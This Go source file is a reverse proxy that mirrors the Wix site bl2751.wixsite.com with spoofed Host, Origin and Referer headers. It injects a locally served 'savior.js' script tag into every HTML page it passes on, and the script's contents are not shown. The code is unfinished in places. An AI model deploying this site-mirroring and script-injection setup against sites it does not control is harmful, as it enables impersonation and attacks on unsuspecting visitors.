package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"strings"
)

// NewProxy takes target host and creates a reverse proxy
func NewProxy(targetHost string) (*httputil.ReverseProxy, error) {
	url, err := url.Parse(targetHost)
	if err != nil {
		return nil, err
	}

	proxy := httputil.NewSingleHostReverseProxy(url)
	proxy.ModifyResponse = modifyResponse()
	return proxy, nil
}

func modifyResponse() func(*http.Response) error {
	return func(resp *http.Response) error {
		fmt.Println("modifyResponse() called!")
		resp.Header.Set("X-Proxy", "Magical")

		if strings.Contains(resp.Request.URL.Path, "javascript") {

		}

		if strings.Contains(resp.Header.Get("Content-Type"), "text/html") {
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				// kill self
			}

			//uost := "api.ecotravel.tech"

			bodyString := string(body)
			fmt.Println(bodyString)
			//bodyString = strings.ReplaceAll(bodyString, "bl2751%2Fwixsite%2Fcom", uost)
			//bodyString = strings.ReplaceAll(bodyString, "bl2751.wixsite.com", uost)
			fmt.Println(bodyString)
			bodyString = strings.ReplaceAll(bodyString, "<head>", "<head><script src=/savior.js></script>")

			resp.Body = io.NopCloser(strings.NewReader(bodyString))
		}
		return nil
	}
}

// ProxyRequestHandler handles the http request using proxy
func ProxyRequestHandler(proxy *httputil.ReverseProxy) func(http.ResponseWriter, *http.Request) {
	return func(w http.ResponseWriter, r *http.Request) {
		r.Host = "bl2751.wixsite.com"

		r.Header.Set("origin", "https://bl2751.wixsite.com")
		r.Header.Set("referer", "https://bl2751.wixsite.com/")

		if r.URL.Path == "/" {
			fmt.Println("i'm here!")
			r.URL.Path = "/mysite"
		}

		if r.URL.Path == "/savior.js" {
			w.Header().Set("Content-Type", "application/javascript")
			b, _ := os.ReadFile("./savior.js")
			w.Write(b)
			return
		}

		r.Header.Set("Accept-Encoding", "indentity")

		proxy.ServeHTTP(w, r)
	}
}

func main() {
	// initialize a reverse proxy and pass the actual backend server url here
	proxy, err := NewProxy("https://bl2751.wixsite.com/")
	if err != nil {
		panic(err)
	}

	// handle all requests to your server using the proxy
	http.HandleFunc("/", ProxyRequestHandler(proxy))
	log.Fatal(http.ListenAndServe(":80", nil))
}
